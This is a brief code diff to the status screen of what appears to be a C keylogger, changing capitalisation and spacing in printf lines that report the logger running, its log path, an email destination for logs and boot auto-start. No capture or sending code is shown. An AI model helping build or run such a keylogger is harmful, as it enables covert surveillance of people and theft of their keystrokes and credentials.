@@ -122,15 +122,15 @@ if (flag_status == 1){
       read_boot();
 
       system("clear");
-      printf("●   Active - Keylogger is running\n");
+      printf("●   Active - keylogger is running\n");
       printf("       Path: %s\n", buffer_path);
       printf("   Emailing: %s\n", buffer_smtp);
-      printf(" Auto-Start: %s\n", buffer_boot);
+      printf(" Auto-start: %s\n", buffer_boot);
       printf("        PID: %s\n", buffer_pid);
       printf("     Memory: %s bytes\n", buffer_size);
       printf(" Start Time: %s\n\n", buffer_time);
       print_path_logs();
-      printf("\n");
+      printf("\n\n");
 
       fclose(readpath);
       fclose(readtime);
